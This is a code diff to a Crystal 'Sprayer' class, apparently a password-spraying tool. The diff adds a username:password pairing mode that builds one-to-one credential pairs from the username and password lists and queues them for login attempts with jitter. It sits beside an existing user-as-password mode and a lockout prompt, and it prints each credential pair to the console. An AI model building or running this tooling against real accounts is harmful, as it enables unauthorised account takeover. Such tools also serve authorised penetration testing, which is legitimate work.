@@ -10,7 +10,7 @@ end
 
 
 class Sprayer
-    property usernames : Array(String), passwords : Array(String), delay : Int32 , jitter : Int32  , target : String, uap : Bool, webhook_url : String 
+    property usernames : Array(String), passwords : Array(String), delay : Int32 , jitter : Int32  , target : String, uap : Bool, upf : Bool, webhook_url : String 
     property valid : Array(String)
     # property rate : Int32
 
@@ -23,6 +23,7 @@ class Sprayer
         @jitter = 1
         @target = "localhost"
         @uap = false
+        @upf = false
         @valid = [] of String
         @webhook_url = ""
         # @channel : Channel(Array(String|Bool|Nil) | Nil)
@@ -38,6 +39,7 @@ class Sprayer
         @jitter = 1
         @target = "localhost"
         @uap = false
+        @upf = false
         @valid = [] of String
         @webhook_url = ""
     end
@@ -52,6 +54,7 @@ class Sprayer
         @jitter = 1
         @valid = [] of String
         @uap = false
+        @upf = false
         @webhook_url = ""
     end
 
@@ -65,6 +68,7 @@ class Sprayer
         @target = "localhost"
         @valid = [] of String
         @uap = false
+        @upf = false
         @webhook_url = ""
     end
 
@@ -205,8 +209,31 @@ class Sprayer
 
 
         # start queuing things to be sprayed
-        # if uap do that
-        if @uap
+        # if user:password format
+        if @upf # user password format ie:    uername:password for 1:1 username password combos 
+            puts "made it to upf"
+            upflist = generate_upf_list()
+            # puts "Sending to queue_channel"
+            upflist.each do |item|
+                if @lockout
+                    STDERR.puts "Lockout detected!!!".colorize(:red)
+                    STDERR.puts "Continue? (y/N)".colorize(:yellow)
+                    x = gets
+                    exit 1 if x.nil? || x == "\r"
+                    if (x.downcase =~ /ye?s?/)
+                        cont = true
+                    else 
+                        STDERR.puts "Quiting spraying attack!!!".colorize(:yellow)
+                        exit 1
+                    end
+                end
+            
+                # print "\rItems in queue to be sprayed: #{queued_count} " 
+                queue_channel.send item 
+                queued_count += 1 
+                jitter() unless item[0] == @usernames.last || valid_accounts.includes? item[0] || already_sprayed.includes? "#{item[0]}:#{item[1]}"
+            end
+        elsif @uap # user as password
             # puts "Generating user:user list"
             uap_list = generate_uap_list()
             # puts "Sending to queue_channel"
@@ -471,6 +498,15 @@ class Sprayer
         ar = [] of Array(String)
         @usernames.each do |uname|
             ar << [uname, uname]
+        end 
+        return ar 
+    end
+
+    protected def generate_upf_list()
+        ar = [] of Array(String)
+        @usernames.each_index do |i|
+            puts "#{@usernames[i]}:#{@passwords[i]}"
+            ar << [@usernames[i] , @passwords[i]]
         end 
         return ar 
     end
